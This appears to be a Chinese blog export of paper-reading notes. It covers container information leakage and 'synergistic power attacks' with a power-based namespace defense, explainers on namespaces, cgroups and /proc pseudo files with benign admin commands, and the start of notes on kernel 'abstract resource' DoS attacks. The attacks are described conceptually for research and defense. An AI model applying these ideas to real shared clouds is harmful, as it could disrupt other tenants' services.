我们与容器云供应商合作解决此信息泄漏问题，并将对容器中托管的应用程序的影响降至最低。这种屏蔽方法可以快速修复基于内存的伪文件系统中的所有泄漏，但它可能会对容器化应用程序的功能增加限制，这与容器提供通用计算平台的概念相矛盾。 在第二阶段，防御方法涉及修复丢失的namespace上下文检查和虚拟化更多的系统资源(即，实现新的namespace)以增强容器的隔离模型。 我们首先向Linux内核维护者报告了与现有namespace相关的信息披露错误，他们很快发布了针对其中一个问题的新补丁([CVE2017-5967])。对于没有namespace隔离保护的其他通道，我们需要更改内核代码，以强制使用更细粒度的系统资源分区。由于每个通道都需要单独修复，因此这种方法可能涉及大量工作。虚拟化一个特定的内核组件可能会影响多个内核子系统。另外，有些系统资源不容易精确地划分到每个容器中。但是，我们认为这是解决问题的根本办法。特别是，为了防御synergistic power attack，我们在Linux内核中设计并实现了一个proof-of-concept power-based namespace，以向每个容器显示分区的电源使用情况。 Power-based Namespace我们提出了一个power-based namespace，通过未更改的RAPL接口向每个容器显示每个容器的power使用情况。在不泄漏整个系统功耗信息的情况下，攻击者无法推断主机的电源状态，从而消除了在良性电源峰值上叠加功耗密集型工作负载的机会。此外，有了每个容器的功率使用统计数据，我们可以动态地限制超过预定义功率阈值的容器的计算能力(或增加使用费用)。容器云管理员可以基于此基于功能的namespace设计粒度更细的计费模型。 我们的设计有三个目标。 准确性:由于没有硬件支持每个容器的功率分区，我们基于软件的功率建模需要准确反映每个容器的功率使用情况。 透明性:容器内的应用程序不知道该命名空间外的功率变化，功率子系统的接口保持不变。 效率:功率分区不应在容器内或容器外引起重要的性能开销。 我们在图中说明了系统的工作流程。我们基于功率的命名空间由三个主要组件组成:数据收集、功率建模和动态校准。我们在容器中保持相同的Intel RAPL接口，但是改变了处理能源使用的读取操作的实现。一旦检测到能源使用的读取操作，修改后的RAPL驱动程序检索每个容器的性能数据(数据收集)，使用检索到的数据来建模能源使用(功率建模)，最后校准建模的能源使用(动态校准)。 我们将在下面详细讨论每个组件。 Data collection为了对每个容器的功耗进行建模，我们需要获得每个容器的 fine-grained performance data。每个容器都与一个cpuacct cgroup相关联。cpuacct cgroup表示容器的处理器核心上的CPU周期。CPU周期累计。我们只使用CPU周期来计算后面的缓存丢失率和分支丢失率。Linux内核还有一个perf_event子系统，它支持计算不同类型的性能事件。The granularity ofperformance accounting 可以是单个进程或一组进程(视为一个per_event cgroup)。到目前为止，我们只为每个perf_event cgroup检索退役指令、缓存缺失和分支缺失(在下一个电源建模组件中需要)的数据。我们当前的实现是可扩展的，可以收集与未来电源建模的变化相对应的更多性能事件类型。 我们从power-based namespace的初始化监视性能事件，并创建多个perf_events，每个事件都与特定的性能事件类型和特定的CPU核心相关联。然后，我们将该容器的perf_cgroup与这些perf_event连接起来，开始计算。此外，我们需要将所有创建的perf_event的所有者设置为TASK TOMBSTONE，这表明这样的性能核算与任何用户进程都是分离的。 Power modeling要实现power-based namespace，我们需要将功率消耗归因于每个容器。RAPL不是提供瞬态功耗，而是分别为package、核心和DRAM提供累计能耗。power消耗可以通过测量时间单位窗口内的能源消耗来计算。 我们power-based namespace还以与原始RAPL接口相同的格式提供了每个容器的累计能量数据。 我们首先将核心的功耗归为属性。 传统的电源建模利用CPU利用率来确定核心的功耗。然而，Xu等证明，在相同的CPU利用率下，power消耗可能会有很大差异。底层管道和数据依赖可能导致CPU失速和功能单元空转。在相同的CPU利用率下，实际退出指令的数量是不同的。 图显示了退役指令和能量之间的关系。我们在四个不同的基准上进行测试:用C编写的空闲循环，prime, 462.SPECCPU2006中的libquantum，以及不同内存配置的strss。我们在主机上运行基准测试，并使用Perf来收集性能统计数据。我们可以看到，对于每个基准测试，能量消耗几乎严格地与退役指令的数量成线性。但是，随着应用类型的不同，拟合线的梯度也相应变化。为了使我们的模型更加准确，我们进一步加入cache miss rate和branch miss rate，建立一个多次多项式模型来拟合斜率。 对于DRAM，我们使用package失败的数量来分析power。图显示了核心实验中相同基准测试和相同配置的能耗。它清楚地表明cache miss的数量与DRAM能量近似线性。 在此基础上，我们利用的线性回归对DRAM能量进行建模。 对于package的功耗，我们将核心、DRAM和一个额外常数的值相加。具体模型如式所示，其中M为建模能量;CM、BM、C分别表示cache miss次数、branch miss次数和CPU周期;F为通过多次线性回归拟合斜率得到的函数。I是退役指令的数量。α， β， γ， λ是由图实验数据得出的常数。 这里我们讨论浮点指令对功率建模的影响。独立的浮点指令可能比整数操作消耗更多的能量。具有高浮点指令比例的工作负载实际上可能导致整体功耗较低，因为功能单元可能被迫在管道的不同阶段处于空闲状态。为了建立一个更精细的模型，有必要考虑微架构。我们计划在今后的工作中朝着这个方向努力。此外，α、β、γ参数的选择也受结构的影响。这样的问题可以在接下来的校准步骤中得到缓解。 On-the-fly calibration我们的系统还为主机的能量数据建模，并与通过RAPL获得的实际能量数据进行交叉验证。为了尽量减小建模数据的误差，我们使用下式对每个容器的建模能量数据进行校准。Econtainer表示返回给每个容器的能量值。这种实时校准是对RAPL接口的每个读取操作进行的，可以有效地减少前一步的错误数量。 Defense Ecaluation我们从三个方面评估本地机器上基于功能的名称空间:准确性、安全性和性能。我们的测试平台配备了Intel i7-6700 3.40GHz 8核CPU, 16GB RAM，运行Ubuntu Linux 16.04，内核版本为4.7.0。 Accuracy我们使用SPECCPU2006基准来测量power建模的准确性。我们将建模的power使用情况与通过RAPL获得的ground truth进行比较。 功耗等于每秒的能量消耗。由于Docker容器的安全策略的限制，我们选择了SPECCPU2006基准测试的一个子集，这些基准测试可以在容器内运行，并且与用于功率建模的基准测试没有重叠。误差ξ定义如下: 其中ERAPL是从主机上的RAPL读取的功耗，而Mcontainer是在容器中读取的相同工作负载的建模功耗。注意，主机和容器都在空闲状态下消耗电力，差别很小。我们使用常数∆diff作为修饰符，反映主机和容器在空闲状态下的功耗差异。结果如图所示，我们的power模型是准确的，因为所有测试基准的误差值都低于0.05。 Security我们也从安全的角度来评估我们的系统。 启用了power-based namespace后，容器应该只检索容器内消耗的功率，而不知道主机的电源状态。我们在测试平台中启动两个容器进行比较。我们在一个容器中运行SPECCPU2006基准测试，并将另一个容器闲置。我们记录容器和主机的每秒用电量。如图所示401.bzip2的结果。所有其他基准测试都表现出类似的模式。 当两个容器都没有工作负载时，它们的功耗与主机的功耗基本相同，从0到10s。一旦容器1在10s启动工作负载，我们可以发现容器1和主机的功耗同时激增。从10s到60s，容器1和主机的功耗基本一致，而容器2仍然处于较低的功耗水平。容器2不知道整个系统的功率波动，因为基于power-based namespace强制隔离。这表明我们的系统能够有效地隔离和划分多个容器的功耗。如果没有电源相关的信息，攻击者将无法发起synergistic power attack。 Performance我们使用UnixBench来比较启用系统前后的性能开销。表列出了所有结果。 正如结果所示，诸如Dhrystone(测试整数和字符串操作)和Whetstone(测试浮点算术性能)这样的CPU基准测试所产生的开销可以忽略不计。 其他基准测试，如shell脚本、管道吞吐量和系统调用，也会触发很少的开销。 在一个并行副本的情况下，基于管道的上下文切换(pip-based context swtiching)确实会产生61.53%的开销，但在8个并行副本时，它会减少到1.63%。我们预计inter-cgroup context switching涉及启用&#x2F;禁用性能事件监视器，而intra-cgroup context switching不涉及任何此类开销。 这解释为什么在禁用power-based namespace情况下，8个并行副本可以保持相似的性能水平。此外，上下文切换只占整个系统性能开销的很小一部分，因此对正常使用的影响很小。 在我们的系统中，对于每个新创建的容器，内核将在每个内核上创建多个perf_events，以收集与性能相关的数据。此测量过程仅对容器过程进行。因此，测量开销将随着容器数量的增加而线性增加。但是，容器数量的增加对系统的影响很小。使用这种机制，在创建所有进程时，内核会检查该进程是否是容器进程。这个检查进程是Unix基准测试中进程创建开销的主要原因。 如表的最后一行所示，UnixBench的总体性能开销对于一个并行副本是9.66%，对于8个并行副本是7.03%。 我们的系统性能在很大程度上依赖于perf_event cgroup的实现，并且可以随着性能监视子系统的改进而提高。 DiscussionSynnergistic Power Attack without the RAPL Channel我们还注意到，一些容器云中的服务器没有配备RAPL或其他类似的嵌入式power meters。这些服务器仍可能面临power attack。如果没有像RAPL这样的power-capping工具，这些服务器在一台机器上可能容易受到host-level power attacks。 此外，如果power data不能直接获得，高级攻击者会尝试根据资源利用信息(如CPU和内存利用率)来近似电源状态，这些信息在已识别的信息泄漏中仍然可用。最好让容器租户无法使用系统范围的性能统计数据。 Complete Container Implementation造成信息泄漏和synergistic power attack的根本原因是Linux内核中隔离机制的不完整实现。最好引入更多的安全特性，比如实现更多的namespace和cgroup。但是，一些系统资源仍然难以分区，如中断、调度信息、温度等。人们还认为，完整的容器实现与虚拟机没有什么不同，并且失去了容器的所有优点。这是容器之间的权衡。如何在容器云中平衡安全性、性能和可用性的问题需要进一步研究。 Related Work由于容器最近变得流行，研究人员对容器和硬件虚拟化之间的性能比较感到好奇。Felter等人通过使用一套涵盖CPU、内存、存储和网络资源的基准测试来比较Docker和KVM的性能。他们的结果显示，Docker在所有情况下都能达到与KVM相同或更好的性能。Spoiala等人使用Kurento媒体服务器来比较Docker和KVM上的WebRTC服务器的性能。他们还证明了Docker的性能优于KVM，可以支持实时应用。Morabito等人比较了传统管理程序和操作系统级虚拟化在计算、存储、内存和网络方面的性能。他们对Docker、LXC和KVM进行了实验，观察到磁盘I&#x2F;O仍然是KVM管理程序的瓶颈。所有这些工作都表明，基于容器的操作系统级虚拟化可以实现比硬件虚拟化更高的性能。除了性能，容器云的安全性始终是一个重要的研究领域。Gupta简要介绍了Docker的安全性。Bui也对Docker容器进行了分析，包括隔离问题和相应的内核安全机制。他们声称，Docker容器在默认配置下是相当安全的。Grattafiori等人总结了容器的各种潜在漏洞。他们还提到了基于内存的伪文件系统中的几个通道。Luo等人证明了错误配置的能力可以被利用来在Docker中建立隐蔽的通道。之前关于容器的性能和安全性的研究工作鼓励我们更多地研究容器如何能够实现与硬件虚拟化相同的安全保证，但在性能方面的折衷却微不足道。我们是第一批系统地识别容器中的信息泄露问题，并研究建立在这些泄漏渠道的基于容器的潜在的power attcak。 Cloud Security and Side&#x2F;Covert Channel Attacks云安全已经受到学术界和业界的广泛关注。云环境下的co-residence检测是与我们工作最密切相关的研究课题。co-residence检测最早由Ristenpart等人提出。他们证明，攻击者可以将恶意VM与目标VM co-residence 在同一服务器上，然后发起侧通道和隐蔽通道攻击。在现有主流云服务中实现co-residence仍然是可行的。为了验证在同一物理服务器上的co-residence，攻击者通常利用侧通道或隐蔽通道，例如，一种广泛采用的方法是使用cahe-based channel。位于同一个包上的多个实例共享最后一级缓存。通过使用一些专用的操作(如cflush)，攻击者可以通过测量缓存访问时间来检测共驻留。Liu等证明了l3缓存侧通道攻击对于跨核和跨vm攻击是可行的。Zhang等人对云进行了真实的侧通道攻击，并提出了几种防御机制来缓解这些攻击。特别是，他们证明了跨租户侧通道攻击可以成功地在PaaS中使用共存服务器进行。除了基于缓存的通道外，内存总线和内存重复数据删除也已被证明是构造隐蔽通道的有效方法。与现有的侧&#x2F;隐蔽通道研究工作不同，我们在容器云设置中发现了系统范围的信息泄漏，并设计了一种新的方法来定量评估泄漏通道的容量，以用于共居检测。另外，与最小化虚拟机的内核攻击面研究相比，我们提出了一种两级防御机制，以最小化容器云上的信息泄漏和电源攻击空间。 系统状态信息，如核心温度和系统功耗，也被用于构建侧&#x2F;隐蔽通道。Thiele等提出了一种基于每个核心温度的热隐蔽通道，并在局部试验台测试了容量。功耗也可能被滥用来破坏AES。在工作中，我们不使用功耗数据作为传递信息的隐蔽通道。相反，我们证明了对手可以利用主机功耗泄漏来发起更高级的power attack。 Power Modeling在没有hardware-based power meter的情况下，power modeling是逼近功耗的一种方法。 Russell等和Chakrabarti等提出了指令级功率建模。他们的工作表明，分支的数量影响功耗。对虚拟机功耗的近似研究有几种。有工作证明了VM级的功耗可以通过CPU利用率和最后一级缓存失误率来估计。Mobius等将VM的功耗分为CPU、缓存、内存和磁盘。BITWATTS在细粒度流程级别上对功耗进行了建模。Shen等提出了一种power容器来计算多核系统中请求的能量消耗。我们对synergistic的防御主要是受到power modeling approach for VMs的启发。我们提出了一种新的power分区技术来近似每个容器的功耗并重用RAPL接口，从而解决了容器设置中的RAPL数据泄漏问题。 Conlusion容器云服务因提供轻量级操作系统级虚拟主机环境而变得流行起来。容器技术的出现深刻地改变了在云中开发和部署分布式应用程序的生态系统。但是，由于Linux内核中系统资源分区机制的不完全实现，对于共享同一个内核的多个容器租户仍然存在一些安全问题。在本文中，我们首先提出了一种系统的方法来发现可能将主机信息暴露给容器的信息泄漏通道。通过利用这些泄露的主机信息，恶意容器租户可以发起一种新型的power attack，这可能会危及数据中心电源系统的可靠性。此外，我们讨论了这些信息泄漏的根本原因，并提出了一个两阶段的防御机制。我们的评估表明，所提出的解决方案是有效的，并引起微不足道的性能开销。 MyLinux的incomplete coverageLinux内核提供了对各种容器化技术的支持，使用户能够在单个主机上运行多个隔离环境。Linux内核中的容器实现主要利用一组特性，如namespace、cgroup和seccomp。然而，在Linux内核中，容器实现的某些方面可能是不完整或有限制的。以下是一些潜在的incomplete coverage范围： namespace：通过创建系统资源的分离视图来为容器提供隔离。虽然Linux内核支持几种命名空间（mout、PID、NET、IPC、UTS和user），但某些资源类型可能没有相应的命名空间或具有有限的支持，这可能导致不完全隔离。 control groups（cgroups）：Cgroups用于限制、记录和隔离进程组使用资源（CPU、内存、I&#x2F;O等）。虽然存在cgroups v1和v2，但某些功能可能无法在两个版本之间得到充分支持或具有局限性。这会导致容器资源管理不完整或不一致。 安全性：Linux内核提供了诸如seccomp、AppArmor和SELinux之类的安全机制来强制访问控件并限制容器可以进行哪些系统调用。但是，这些机制可能存在漏洞或限制，可能会暴露潜在的安全风险。 兼容性：容器实现的某些功能（如文件系统快照或检查点&#x2F;恢复）可能取决于特定的内核版本、存储驱动程序或文件系统。这可能导致在某些配置上出现兼容性问题和限制。 性能：虽然Linux内核为容器工作负载提供了各种优化，但仍有一些领域可以改进，例如存储I&#x2F;O或网络吞吐量。 内核更新：随着新功能和改进被添加到Linux内核中，容器实现可能需要更新以利用这些增强功能。在某些情况下，这可能会导致容器支持方面存在差距，直到它们与新的内核特性完全集成并进行测试。 值得注意的是，Linux内核正在积极开发中，并且对于容器支持的改进不断被提出和实施。此外，像Docker、Kubernetes和LXC之类的容器化解决方案建立在这些内核特性之上，并提供更完整、无缝的用户体验。 数据中心的oversubscription电力超额订阅是数据中心使用的一种策略，其中分配给服务器、存储系统和网络设备的总电源供应超过实际可用电源供应。这种方法基于一个观察结果：并非所有设备同时消耗其最大额定功率。通过利用这一点，数据中心可以托管比其电力基础设施允许更多的服务器和设备。 Linux子系统Linux子系统是Linux内核中的一部分，负责处理特定功能或设备。例如，文件系统、网络协议栈、进程调度等都可以被认为是Linux子系统。它们通常以模块的形式实现，并在运行时加载到内核中。这些子系统允许Linux内核与硬件和外部资源进行交互，以便为上层应用程序提供所需的功能。 执行上下文执行上下文是操作系统在运行某个任务时的环境，它包括一个任务所需的所有状态信息。这包括程序计数器、堆栈指针、寄存器值、内存分配信息等。执行上下文使得操作系统能够在多个任务之间进行切换，以实现多任务并发执行。 Linux子系统不能区分容器和主机之间的执行上下文，可能泄露系统信息容器是一种轻量级的虚拟化技术，允许在同一主机上运行多个隔离的应用程序。容器与主机共享相同的内核，但每个容器都有其独立的文件系统、进程空间、网络接口等。容器技术的一个关键优势是资源隔离，这意味着每个容器只能访问分配给它的资源，而不能访问其他容器或主机的资源。 然而，某些Linux子系统可能无法区分容器和主机之间的执行上下文。这意味着当容器化应用程序访问这些子系统时，它们可能能够访问不应暴露给它们的系统范围信息。这可能导致安全和隐私问题，因为容器之间和容器与主机之间的隔离可能被破坏。 例如，如果某个Linux子系统负责处理系统范围的统计信息（如CPU使用率、内存使用情况等），那么容器内的应用程序可能能够访问这些信息，从而获取其他容器或主机的资源使用情况。这可能导致容器之间的信息泄露，破坏了它们之间的隔离。 为了解决这个问题，容器运行时和内核开发人员需要确保所有Linux子系统都能够正确地区分容器和主机之间的执行上下文，以实现更强大的隔离和安全性。这可能包括修改子系统的实现，以便它们能够识别和处理来自容器的请求，以及限制容器访问系统范围信息的能力。 Namespace和cgroup以及具体实现Linux中的Namespace和Cgroup是两种操作系统级别的资源管理和隔离技术。它们在容器技术（如Docker）中被广泛应用，用于实现轻量级虚拟化。 Namespace（命名空间） 是Linux内核提供的一种隔离技术，允许创建多个独立的空间，每个空间内可以有自己的进程、文件系统、网络等资源。Namespace有以下几种类型： Mount Namespace：隔离不同命名空间的文件系统挂载点。 PID Namespace：隔离进程ID空间，使每个命名空间有独立的PID。 Network Namespace：隔离网络接口和路由表，使每个命名空间有独立的网络环境。 IPC Namespace：隔离System V IPC对象和POSIX消息队列。 UTS Namespace：隔离主机名和域名。 User Namespace：隔离用户和组ID。 Cgroup（控制组） 是Linux内核提供的一种资源管理技术，允许对一组进程进行资源限制、优先级调整等操作。Cgroup通过将进程组织到层次结构的控制组中来实现资源管理。主要有以下几类资源控制： CPU：限制进程的CPU使用率。 Memory：限制进程的内存使用。 Block I&#x2F;O：限制进程的磁盘I&#x2F;O。 Network：限制进程的网络带宽。 以下是一个简单的Namespace和Cgroup的使用示例： 安装相关工具： 1sudo apt-get install cgroup-tools 创建一个新的Namespace（使用unshare命令）： 1sudo unshare --uts --pid --mount-proc --fork /bin/bash 这个命令创建了一个新的Namespace，并在其中启动了一个新的bash进程。这个新的Namespace具有独立的UTS、PID和挂载的&#x2F;proc文件系统。 创建一个新的Cgroup（使用cgcreate命令）： 1sudo cgcreate -g cpu,memory:/my_cgroup 这个命令创建了一个名为my_cgroup的新Cgroup，用于管理CPU和内存资源。 为Cgroup分配资源限制（使用cgset命令）： 12sudo cgset -r cpu.shares=512 my_cgroupsudo cgset -r memory.limit_in_bytes=100M my_cgroup 这个命令为my_cgroup设置了CPU份额为512（相对权重）和内存限制为100MB。 将进程添加到Cgroup（使用cgclassify命令）： 1sudo cgclassify -g cpu,memory:my_cgroup &lt;PID&gt; 将指定的进程PID添加到my_cgroup中，使其受到Cgroup资源限制的约束。 以上示例展示了如何使用Namespace和Cgroup进行资源隔离和管理。在实际应用中，这些技术通常与容器运行时（如Docker）结合使用，以提供更高级别的抽象和管理工具。 Namespace和Cgroup的具体使用Namespace 和 cgroup 是 Linux 内核提供的两个关键特性，它们在容器技术（如 Docker）中发挥着重要作用。Namespace 负责为容器提供独立的视图，使得容器在网络、进程、文件系统等方面与主机和其他容器隔离。而 cgroup（控制组）则负责限制和管理容器的资源使用（如 CPU、内存、磁盘 I&#x2F;O 等）。 Namespace 例子： 假设我们想要创建一个新的网络 Namespace，使容器具有独立的网络栈。我们可以使用 ip 命令来实现这一目标： 123456789101112131415# 创建一个新的网络 Namespacesudo ip netns add my_namespace# 将网络设备 veth0（容器端）和 veth1（主机端）添加到新的 Namespacesudo ip link add veth0 type veth peer name veth1sudo ip link set veth0 netns my_namespace# 配置容器端网络设备sudo ip netns exec my_namespace ip addr add 192.168.1.2/24 dev veth0sudo ip netns exec my_namespace ip link set veth0 upsudo ip netns exec my_namespace ip route add default via 192.168.1.1# 配置主机端网络设备sudo ip addr add 192.168.1.1/24 dev veth1sudo ip link set veth1 up 在这个例子中，我们创建了一个新的网络 Namespace，并配置了一对虚拟以太网设备（veth0 和 veth1），将容器的网络与主机网络连接起来。这使得容器可以拥有独立的网络栈，与主机和其他容器隔离。 cgroup 例子： 假设我们想要限制容器的 CPU 和内存资源。我们可以使用 cgroup 来实现这一目标： 123456789101112131415# 创建一个新的 cgroupsudo mkdir -p /sys/fs/cgroup/cpu/my_cgroupsudo mkdir -p /sys/fs/cgroup/memory/my_cgroup# 限制容器的 CPU 使用率为 50%echo 50000 &gt; /sys/fs/cgroup/cpu/my_cgroup/cpu.cfs_quota_usecho 100000 &gt; /sys/fs/cgroup/cpu/my_cgroup/cpu.cfs_period_us# 限制容器的内存使用为 100MBecho 100000000 &gt; /sys/fs/cgroup/memory/my_cgroup/memory.limit_in_bytes# 启动一个新的容器，并将其添加到我们之前创建的 cgroupdocker run -itd --name=my_container ubuntu:18.04echo $(docker inspect -f &#x27;&#123;&#123;.State.Pid&#125;&#125;&#x27; my_container) &gt; /sys/fs/cgroup/cpu/my_cgroup/cgroup.procsecho $(docker inspect -f &#x27;&#123;&#123;.State.Pid&#125;&#125;&#x27; my_container) &gt; /sys/fs/cgroup/memory/my_cgroup/cgroup.procs 在这个例子中，我们创建了一个新的 CPU 和内存 cgroup，并限制了容器的 CPU 使用率和内存使用。然后我们启动了一个新的容器，并将其添加到我们之前创建的 cgroup 中，这样容器的资源使用就受到了限制。 综上所述，Namespace 和 cgroup 在容器技术中发挥着重要作用，使得容器可以在资源使用和隔离方面实现更精细的控制。 Linux中的pseudo file在 Linux 系统中，伪文件（pseudo file）是一种特殊类型的文件，它们提供了与系统内核和设备驱动程序交互的途径。伪文件并不包含实际的文件数据，而是在用户和内核空间之间提供了一个通信接口。这些文件通常位于 /proc 和 /sys 文件系统中。 /proc 文件系统是一个虚拟文件系统，包含了许多伪文件，这些伪文件可以用来监控和调整系统内核的运行状态。例如，/proc/cpuinfo 提供了有关处理器的详细信息，/proc/meminfo 提供了关于系统内存使用情况的数据。这些伪文件可以像普通文件一样使用命令行工具（如 cat、grep 等）进行查看和操作。 /sys 文件系统是另一个虚拟文件系统，用于 Linux 内核的设备管理。它包含了许多伪文件，这些伪文件提供了对系统设备的配置和状态信息的访问。/sys 文件系统的结构更加规范化，按照设备、总线和驱动程序的层次关系进行组织。 总之，伪文件在 Linux 系统中提供了一种简单、统一的方法，使用户能够方便地访问和修改系统内核和设备驱动程序的状态信息。 pseudo file和真实文件的区别伪文件（pseudo file）和真实文件在 Linux 系统中具有不同的特点和用途。以下是它们之间的主要区别： 数据存储：真实文件存储在磁盘上，包含实际的文件数据。而伪文件并不包含实际的文件数据，它们通常不存在于磁盘上，而是由内核动态生成，用于在用户空间和内核空间之间提供通信接口。 用途：真实文件用于存储和读取数据，例如文档、图像或程序。伪文件主要用于提供系统信息、监控和调整内核参数或设备驱动程序的状态。它们可以让用户通过文件系统接口与内核交互，而无需使用特殊的系统调用。 位置：真实文件通常分布在整个文件系统中，根据目录结构进行组织。伪文件主要位于特定的虚拟文件系统中，例如 /proc（用于内核参数和进程信息）和 /sys（用于设备管理）。 访问方式：伪文件和真实文件都可以使用类似的命令行工具（如 cat、grep 等）进行查看和操作。然而，伪文件通常是只读的或仅支持特定操作，它们的内容可能会随着系统状态的变化而动态改变。 总之，伪文件和真实文件在数据存储、用途、位置和访问方式上存在显著差异。伪文件主要用于提供与内核和设备驱动程序的交互途径，而真实文件用于存储和读取实际数据。 伪文件例子/proc/loadavg 伪文件是由内核动态生成的，不在磁盘上存在。它允许用户和程序通过熟悉的文件系统接口访问负载平均值信息，而无需使用特殊的系统调用。 要使用 /proc/loadavg，您可以像读取常规文件一样简单地读取其内容。例如，您可以使用 cat 命令在终端中显示其内容： 1cat /proc/loadavg 输出可能类似于以下内容： 10.51 0.38 0.35 1/1234 5678 这些数字分别表示 1 分钟、5 分钟和 15 分钟的负载平均值，后面的数字表示当前正在运行的进程数&#x2F;系统总进程数，以及最近分配的进程 ID。 总之，/proc/loadavg 是一个伪文件的示例，它为访问 Linux 系统中的负载平均值信息提供了一个接口，无需使用特殊的系统调用。","categories":[{"name":"论文精读","slug":"论文精读","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/"},{"name":"内核安全","slug":"论文精读/内核安全","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"云安全","slug":"云安全","permalink":"http://example.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"}]},{"title":"论文阅读 Demons in the Shared Kernel: Abstract Resource Attacks Against","slug":"论文阅读 Demons-in-the-Shared-Kernel-Abstract-Resource-Attacks-Against","date":"2023-03-30T14:06:58.000Z","updated":"2023-04-16T12:31:41.581Z","comments":true,"path":"2023/03/30/论文阅读 Demons-in-the-Shared-Kernel-Abstract-Resource-Attacks-Against/","link":"","permalink":"http://example.com/2023/03/30/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%20Demons-in-the-Shared-Kernel-Abstract-Resource-Attacks-Against/","excerpt":"摘要 由于其更快的启动速度和更好的资源利用效率，OS-level的虚拟化（virtualization）已被广泛采用，并成为云计算的一项基本技术。与硬件虚拟化相比，OS-level的虚拟化利用共享内核（shared-kernel）设计来实现高效率，并在共享内核上运行多个用户空间实例（又称容器） 然而，在本文中，我们揭示了一种新的攻击面，它是操作系统级虚拟化所固有的，会影响Linux、FreeBSD和Fuchsia。根本原因是操作系统级虚拟化中的共享内核设计导致容器直接或间接地共享成千上万的内核变量和数据结构。在不利用任何内核漏洞的情况下，非特权容器可以轻松耗尽共享的内核变量和数据结构实例，从而对其他容器发起DoS攻击。与物理资源相比，这些内核变量或数据结构实例(称为抽象资源)更普遍，但保护不足。","text":"摘要 由于其更快的启动速度和更好的资源利用效率，OS-level的虚拟化（virtualization）已被广泛采用，并成为云计算的一项基本技术。与硬件虚拟化相比，OS-level的虚拟化利用共享内核（shared-kernel）设计来实现高效率，并在共享内核上运行多个用户空间实例（又称容器） 然而，在本文中，我们揭示了一种新的攻击面，它是操作系统级虚拟化所固有的，会影响Linux、FreeBSD和Fuchsia。根本原因是操作系统级虚拟化中的共享内核设计导致容器直接或间接地共享成千上万的内核变量和数据结构。在不利用任何内核漏洞的情况下，非特权容器可以轻松耗尽共享的内核变量和数据结构实例，从而对其他容器发起DoS攻击。与物理资源相比，这些内核变量或数据结构实例(称为抽象资源)更普遍，但保护不足。 为了说明限制抽象资源的重要性，我们针对操作系统内核的不同方面进行了抽象资源攻击。结果表明，攻击抽象的资源是非常实用和关键的。我们进一步进行了系统分析，识别出Linux内核中脆弱的抽象资源，成功检测到1010个抽象资源，其中501个可以动态重复使用。我们还在前四家云供应商的自部署共享内核容器环境中进行了攻击实验。结果表明，所有环境都容易受到抽象资源攻击。我们得出结论，containing抽象资源是困难的，并给出了多种策略来降低风险 CCS CONCEPTS Security and privacy -&gt; Virtualization and security KEYWORDS OS-level Virtualization；Shared Kernel；Abstract Resource Attack IntroductionOS-level虚拟化允许多个包含且隔离的用户空间环境在同一个内核上运行。与硬件虚拟化相比（虚拟机），OS-level虚拟化消除了为每个用户空间实例维护操作系统内核的负担，因此具有更快的启动速度和更好的资源利用效率。因此，OS-level虚拟化在近年来得到了广泛的应用，并成为云计算的基础技术。OS-level虚拟化中的空间实例在FreeBSD中命名为jails，在Solaris命名为Zones，在Linux中命名为containers。 尽管OS-level的虚拟化效率很高，但它也带来了多种安全问题。首先，由于共享内核，操作系统级虚拟化容易受到内核漏洞的攻击。因此，它不能隔离内核错误。一旦共享内核受到威胁，所有用户空间实例(称为容器)都将失去隔离和保护。此外，研究人员最近对容器技术的隔离提出了质疑，例如信息泄漏、隐蔽通道和out-of-band workloads 打破了cgroup。 然而，在本文中，我们揭示了OS-level虚拟化所固有的一种新的攻击面（attack surface）。与硬件虚拟化相比，OS-level虚拟化利用共享内核设计来实现高效率。在典型的OS-level虚拟化环境中，容器运行在相同的操作系统内核上，并通过300多个系统调用请求各种服务。请注意，底层OS内核包含数十万个变量和数据结构实例，用于为容器提供服务。因此，这些容器直接或间接地共享这些内核变量和数据结构实例。 不幸的是，这些共享的内核变量和数据结构实例是OS-level中的新攻击面。在不利用任何漏洞的情况下，非特权容器可以轻松耗尽某些内核变量和数据结构实例，从而在OS-level虚拟化环境中引起DoS攻击。因此，即使其他容器拥有足够的物理资源，但随着内核关键变量或数据结构实例的耗尽，它们仍然不能执行任何有意义的任务。与真实硬件所支持的物理资源相比，我们将这些内核变量或数据结构实例视为抽象资源，将对这些资源的用尽攻击视为抽象资源攻击（abstract resource attack）。 尽管抽象资源可以被用于DoS攻击，但它们往往得不到充分保护。内核和容器开发人员更关注保护物理资源，而不是抽象资源。例如，Linux内核提供了cgroup来限制每个容器实例的资源使用。但在13个cgroup中，有12个是物理资源cgroup，限制CPU、内存、存储、IO等资源的使用。只有pid cgroup是为限制抽象资源pid而设计的。因此，数百种容器共享的抽象资源没有任何限制，例如global dirty ratio、open-file structs和pseudo-terminal structs，这使它们容易受到DoS攻击。 为了展示在OS-level上限制抽象资源的重要性，我们在Linux内核上使用Docker容器进行攻击，针对操作系统服务的不同方面的抽象资源，包括进程管理、内存管理、存储管理和IO管理。 我们的实验证明攻击抽象资源是非常实用和关键的-它很容易地禁用新程序的执行，降低内存写入速度97.3%，使所有文件打开相关地操作崩溃，并拒绝所有新的SSH连接。更糟糕地是，它会影响操作系统服务的所有方面。此外，实验还表明，除了Linux FreeBSD和Fuchsia也容易受到抽象资源攻击。 遗憾的是，尽管抽象资源很重要，但由于几个基本原因，它们本身就很难contain。首先，在操作系统内核中列举所有可能的抽象资源是不切实际的。与很少的物理资源类型不同，内核中的抽象资源类型是多种多样的。第二，很容易形成导致抽象资源枯竭的条件。在内核中实现新特性时，开发人员经常关注物理资源的消耗，而很少关注抽象资源的消耗。此外，OS内核具有复杂的数据和路径依赖关系，导致内核中的抽象资源以各种方式耗尽。 因此，我们设计了一个基于LLVM的工具，系统地识别Linux内核中脆弱的抽象资源。我们提出了识别可共享抽象资源并分析其容器可控性的新技术。我们将我们的工具应用于新的Linux内核，并检测1010个抽象资源。其中501个可以动态地重复使用，从检测到的抽象资源中，我们根据我们的熟悉度挑选了7个影响操作系统各个方面的资源（即，我们知道耗尽该资源的影响）。我们进一步对部署在四大云供应商（包括AWS、MS 